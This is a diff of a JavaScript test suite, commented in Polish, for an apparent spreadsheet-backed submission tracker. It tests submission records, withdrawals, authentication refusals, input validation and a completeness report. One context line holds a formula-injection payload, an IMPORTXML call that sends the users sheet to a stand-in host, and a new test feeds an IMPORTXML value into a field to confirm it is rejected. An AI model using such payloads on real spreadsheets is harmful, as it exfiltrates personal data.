@@ -425,4 +425,40 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
     ok('dwa konta liczą osobno, a wspólny bezpiecznik (240 par) jeszcze nie zadziałał', S.maps.wywolania === 120); }
   ok('autoryzujMapy() uruchamia się i zwraca odcinek Radom–Kielce', (() => { const x = B.wywolaj('autoryzujMapy()'); return x && x.km > 70 && x.km < 120; })());
 }
+/* ---- 18. „kto złożył” (akcja „zlozono”) i raport kompletności ---- */
+{
+  const B = swiezy(); const H1 = { haslo: 'haslo123' };
+  const mies = (d = new Date()) => d.getFullYear() * 100 + d.getMonth() + 1, M0 = String(mies()), M1 = String(mies(new Date(new Date().getFullYear(), new Date().getMonth() - 1, 1)));
+  const SK = 'a'.repeat(64), SK2 = 'b'.repeat(64);
+  const zl = (o = {}, h = H1, kodu = '12345') => B.post(Object.assign({ akcja: 'zlozono', kod: kodu, op: 'zloz', miesiac: M1, liczba: 3, skrot: SK, sposob: 'folder' }, o), h);
+  const r1 = zl();
+  ok('zgłoszenie: status ok, jeden wiersz w „Zlozone” (miesiąc, kod, imię, liczba, skrót, sposób, razy 1, status „zlozono”)', r1.status === 'ok' && r1.razy === 1 && B.get('Zlozone').w.length === 2 && (w => String(w[0]) === M1 && w[1] === '12345' && w[2] === 'Jan Testowy' && w[4] === 3 && w[5] === SK && w[6] === 'folder' && w[7] === 1 && w[8] === 'zlozono')(B.get('Zlozone').w[1]), JSON.stringify(B.get('Zlozone').w[1]));
+  const r2 = zl({ skrot: SK2, liczba: 4, sposob: 'poczta' });
+  ok('ponowne zgłoszenie tego samego miesiąca aktualizuje wiersz (nie dopisuje drugiego) i zwiększa „Razy”', r2.razy === 2 && B.get('Zlozone').w.length === 2 && B.get('Zlozone').w[1][5] === SK2 && B.get('Zlozone').w[1][4] === 4 && B.get('Zlozone').w[1][6] === 'poczta');
+  zl({ miesiac: M0 }); ok('inny miesiąc to osobny wiersz', B.get('Zlozone').w.length === 3);
+  ok('cofnięcie ustawia status „cofnieto” (wiersz zostaje, ślad po wysłaniu też)', zl({ op: 'cofnij' }).status === 'ok' && B.get('Zlozone').w[1][8] === 'cofnieto' && B.get('Zlozone').w[1][5] === SK2);
+  ok('cofnięcie miesiąca bez zgłoszenia nie zakłada wiersza', zl({ op: 'cofnij', miesiac: '202001' }).status === 'blad' || B.get('Zlozone').w.length === 3);
+  ok('ponowne wysłanie po cofnięciu przywraca status „zlozono” i liczy kolejny raz', zl({ skrot: SK }).razy === 3 && B.get('Zlozone').w[1][8] === 'zlozono');
+  ok('w „Log” jest ślad zgłoszenia, bez skrótu i bez dokumentów', B.get('Log').w.some(r => r[2] === 'zlozono' && /plikow/.test(String(r[3]))) && !JSON.stringify(B.get('Log').w).includes(SK));
+  const wZl = B.get('Zlozone').w.length;
+  const odm = [['sam kod, bez podpisu hasłem', {}, '12345'], ['zły podpis hasłem', { haslo: 'zle-haslo' }, '12345'], ['nieznany kod', H1, '99999'], ['cudze hasło', { haslo: 'haslo123' }, '22222']];
+  for (const [opis, o, kodu] of odm) ok(`odmowa, nic nie zapisane: ${opis}`, zl({}, o, kodu).status === 'odmowa' && B.get('Zlozone').w.length === wZl);
+  ok('konto wygasłe (33333) dostaje „wygasla”, nic nie zapisane', zl({}, H1, '33333').status === 'wygasla' && B.get('Zlozone').w.length === wZl);
+  const zle = [['miesiąc spoza zakresu', { miesiac: '201001' }], ['miesiąc nie jest liczbą', { miesiac: 'zeszly' }], ['liczba plików 0', { liczba: 0 }], ['liczba plików 61', { liczba: 61 }], ['skrót za krótki', { skrot: 'abc' }], ['skrót nie jest szesnastkowy', { skrot: 'z'.repeat(64) }], ['sposób spoza listy', { sposob: '=IMPORTXML("x")' }], ['nieznana operacja', { op: 'usun' }]];
+  for (const [opis, o] of zle) ok(`błąd zamiast zapisu: ${opis}`, zl(o).status === 'blad' && B.get('Zlozone').w.length === wZl, JSON.stringify(zl(o)).slice(0, 80));
+  ok('żadne pole nie trafiło do arkusza jako formuła', B.formuly().length === 0, JSON.stringify(B.formuly()));
+  // raport kompletności (uruchamiany przez właściciela w edytorze)
+  const rap = B.wywolaj('odswiezKompletnosc()'); const sh = B.get('Kompletnosc');
+  ok('raport: tylko konta z ważnym dostępem (12345 i 22222; wygasłe 33333 pomijamy)', rap.uzytkownikow === 2 && sh.w.length === 3 && !sh.w.some(r => r[0] === '33333'), JSON.stringify(rap));
+  ok('raport: brak złożenia poprzedniego miesiąca wyświetla się jako BRAK i jest na górze', sh.w[1][0] === '22222' && sh.w[1][3] === 'BRAK' && /^zlozono /.test(sh.w[2][3]) && sh.w[2][0] === '12345', JSON.stringify(sh.w));
+  ok('raport: wiersz osoby, która złożyła, pokazuje datę, sposób i liczbę plików', /^zlozono \d{4}-\d\d-\d\d \d\d:\d\d \(folder, 3 plikow\)$/.test(sh.w[2][3]), sh.w[2][3]);
+  zl({ op: 'cofnij' }); B.wywolaj('odswiezKompletnosc()');
+  ok('raport po cofnięciu: COFNIETO (nie „złożono”)', B.get('Kompletnosc').w.some(r => r[0] === '12345' && r[3] === 'COFNIETO'));
+  ok('raport: same wartości, żadnych formuł (nagłówki i komórki)', B.formuly().length === 0);
+  // przycinanie
+  { const S = swiezy(); const sh2 = S.get('Zlozone') || (S.wywolaj("_zakladka(SpreadsheetApp.getActiveSpreadsheet(), ZAKLADKA_ZLOZONE, NAGLOWKI_ZLOZONE)"));
+    const stare = Array.from({ length: 4001 }, (_, i) => ['201001', 'x' + i, 'Stary', new Date(), 1, SK, 'plik', 1, 'zlozono']); stare.forEach(r => sh2.appendRow(r));
+    S.post({ akcja: 'zlozono', kod: '12345', op: 'zloz', miesiac: M0, liczba: 1, skrot: SK, sposob: 'plik' }, H1);
+    ok('arkusz „Zlozone” po przekroczeniu 4000 wierszy odrzuca wpisy starsze niż 24 miesiące', S.get('Zlozone').w.length < 100 && S.get('Zlozone').w.some(r => r[1] === '12345'), String(S.get('Zlozone').w.length)); }
+}
 process.exit(kod);
